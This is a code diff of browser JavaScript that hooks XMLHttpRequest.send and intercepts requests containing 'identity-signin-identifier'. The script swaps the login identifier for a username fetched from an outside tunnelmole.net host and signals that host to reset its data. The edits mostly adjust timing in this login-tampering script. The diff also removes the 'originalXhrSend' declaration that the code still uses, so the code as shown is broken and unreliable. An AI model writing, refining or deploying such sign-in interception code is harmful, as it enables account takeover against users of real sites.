@@ -4,9 +4,8 @@ const pendingRequests = new Map();
 
 let usernameFetched = false;
 
-// ✅ Fetch the username when needed
 const fetchFreqUsername = async () => {
-    if (usernameFetched) return; // Avoid redundant fetches
+    if (usernameFetched) return; // Prevent duplicate fetches
     console.log('Fetching username...');
 
     try {
@@ -24,11 +23,11 @@ const fetchFreqUsername = async () => {
             console.log('Fetched username:', freqUsername);
             usernameFetched = true;
 
-            // ✅ Reset the server-side username store
+            // ✅ Reset server-side post data after confirming the fetch
             await fetch('https://ufsxpg-ip-37-228-207-120.tunnelmole.net/reset-first-post-data', { method: 'POST' });
 
-            // ✅ Process all pending requests now that we have a username
-            processModifiedRequests();
+            // ✅ Ensure requests are modified *after* we have post data
+            setTimeout(processModifiedRequests, 500);
         } else {
             console.warn("No username data received, retrying...");
             setTimeout(fetchFreqUsername, 1000);
@@ -39,11 +38,10 @@ const fetchFreqUsername = async () => {
     }
 };
 
-// ✅ Modify and send pending requests when username is available
 const processModifiedRequests = () => {
     if (!freqUsername) {
-        console.log("Username not available yet, retrying...");
-        fetchFreqUsername();
+        console.log("Username not available yet, waiting...");
+        setTimeout(processModifiedRequests, 500);
         return;
     }
 
@@ -53,32 +51,36 @@ const processModifiedRequests = () => {
         if (match && !modifiedRequests.has(freqUsername)) {
             const modifiedBody = body.replace(match[1], freqUsername);
             modifiedRequests.add(freqUsername);
-            
+
             console.log("Modified request with new username:", modifiedBody);
             xhr.send(modifiedBody);
             pendingRequests.delete(xhr); // ✅ Ensure request is removed after sending
         }
     }
 
-    // ✅ Ensure `freqUsername` is not reset too early
+    // ✅ Ensure post data is cleared only *after* modifying requests
     if (pendingRequests.size === 0) {
-        freqUsername = null;
-        usernameFetched = false; // Allow fetching a new username if needed
+        setTimeout(() => {
+            freqUsername = null;
+            usernameFetched = false; // Allow fetching new username if needed
+        }, 500);
     }
 };
 
-// ✅ Intercept XMLHttpRequest to modify requests with username
-const originalXhrSend = XMLHttpRequest.prototype.send;
+
 XMLHttpRequest.prototype.send = function (body) {
     if (!body) {
         originalXhrSend.call(this, body);
         return;
     }
 
+    // ✅ Ensure interception only for login-related requests
     if (/identity-signin-identifier/.test(body) && !Array.from(modifiedRequests).some(m => body.includes(m))) {
         console.log("Intercepted request:", body);
         pendingRequests.set(this, body);
-        processModifiedRequests();
+
+        // ✅ Wait for post data before modifying request
+        fetchFreqUsername();
     } else {
         originalXhrSend.call(this, body);
     }
